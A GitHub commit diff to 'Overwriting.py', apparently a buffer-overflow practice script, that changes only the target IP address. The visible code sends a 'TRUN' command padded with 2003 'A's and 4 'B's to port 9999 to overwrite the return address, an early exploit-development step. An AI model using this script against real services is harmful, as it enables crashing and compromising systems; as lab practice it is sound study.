429f95cd3e0b9ce7bd18f25089ea0a7cb9f60d1a
Liam Wood <68404882+Shutdown-exe@users.noreply.github.com>
2020-12-14 16:37:44 +1100

    Update Overwriting.py

--- Overwriting.py
+++ Overwriting.py
@@ -8,7 +8,7 @@ shellcode = "A" * 2003 + "B" * 4  #place this in terminal /usr/share/metasploit-
 
 try:
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect(('10.0.0.27',9999))
+	s.connect(('192.168.1.88',9999))
 	s.send(('TRUN /.:/' + shellcode)) 
 	s.close()
 
